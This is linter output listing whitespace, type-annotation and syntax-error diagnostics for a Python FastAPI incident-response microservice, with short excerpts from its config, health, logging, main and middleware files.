help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:59:1
   |
57 |         """Check if running in production"""
58 |         return self.ENVIRONMENT == "production"
59 |     
   | ^^^^
60 |     def is_development(self) -> bool:
61 |         """Check if running in development"""
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:66:1
   |
65 | # Global settings instance
66 | settings = Settings()
   | ^
67 |
68 | # Validate critical settings on import
   |

invalid-syntax: Expected an indented block after `if` statement
  --> emergent-microservices\autonomous-incident-reflex-system\app\config.py:70:1
   |
68 | # Validate critical settings on import
69 | if settings.is_production():
70 | if "changeme" in settings.API_KEYS:
   | ^^
71 |         raise ValueError("API_KEYS must be changed in production")
72 | if settings.JWT_SECRET == "changeme-secret-key":
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\autonomous-incident-reflex-system\app\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> emergent-microservices\autonomous-incident-reflex-system\app\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-incident-reflex-system\app\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-incident-reflex-system\app\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("autonomous_incident_reflex_system")
   | ^
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting Autonomous Incident Reflex System service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down Autonomous Incident Reflex System service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down Autonomous Incident Reflex System service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
   |                 ^^^^^^^
87 | Threat detection microservice
88 | Policy evaluation gate
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:87:1
   |
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
87 | Threat detection microservice
   | ^^^^^^
88 | Policy evaluation gate
89 | Reflexive action executor
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:87:8
   |
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
87 | Threat detection microservice
   |        ^^^^^^^^^
88 | Policy evaluation gate
89 | Reflexive action executor
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:87:18
   |
85 |     title="Autonomous Incident Reflex System",
86 |     description="Build:
87 | Threat detection microservice
   |                  ^^^^^^^^^^^^
88 | Policy evaluation gate
89 | Reflexive action executor
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:88:1
   |
86 |     description="Build:
87 | Threat detection microservice
88 | Policy evaluation gate
   | ^^^^^^
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:88:8
   |
86 |     description="Build:
87 | Threat detection microservice
88 | Policy evaluation gate
   |        ^^^^^^^^^^
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:88:19
   |
86 |     description="Build:
87 | Threat detection microservice
88 | Policy evaluation gate
   |                   ^^^^
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:89:1
   |
87 | Threat detection microservice
88 | Policy evaluation gate
89 | Reflexive action executor
   | ^^^^^^^^^
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:89:11
   |
87 | Threat detection microservice
88 | Policy evaluation gate
89 | Reflexive action executor
   |           ^^^^^^
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:89:18
   |
87 | Threat detection microservice
88 | Policy evaluation gate
89 | Reflexive action executor
   |                  ^^^^^^^^
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:90:1
   |
88 | Policy evaluation gate
89 | Reflexive action executor
90 | Evidence preservation pipeline
   | ^^^^^^^^
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:90:10
   |
88 | Policy evaluation gate
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |          ^^^^^^^^^^^^
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:90:23
   |
88 | Policy evaluation gate
89 | Reflexive action executor
90 | Evidence preservation pipeline
   |                       ^^^^^^^^
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:91:1
   |
89 | Reflexive action executor
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   | ^^^^^^^^^^^^^
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:91:15
   |
89 | Reflexive action executor
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |               ^^^^^
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:91:32
   |
89 | Reflexive action executor
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
   |                                ^^^^^^^
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:92:1
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   | ^^^^^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:92:6
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |      ^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:92:8
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |        ^^^^^^^^^^^^^^^^^^^^^^^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:92:32
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |                                ^^^^^^^^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:92:57
   |
90 | Evidence preservation pipeline
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |                                                         ^^^^^^
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:93:9
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |         ^^^^^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:93:16
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                ^^^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:93:21
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                     ^^^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:93:26
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                          ^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:93:26
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                          ^^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:93:29
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                             ^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found string
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:93:29
   |
91 | Cryptographic chain-of-custody service
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
   |                             ^^
94 |     version="1.0.0",
95 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\app\main.py:94:5
   |
92 | Think: CrowdStrike + immutable evidence + deterministic replay.
93 | Defense sector eats this up.",
94 |     version="1.0.0",
   |     ^^^^^^^
95 |     lifespan=lifespan,
96 | docs_url="/api/v1/docs",
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:97:1
   |
95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:143:1
    |
141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
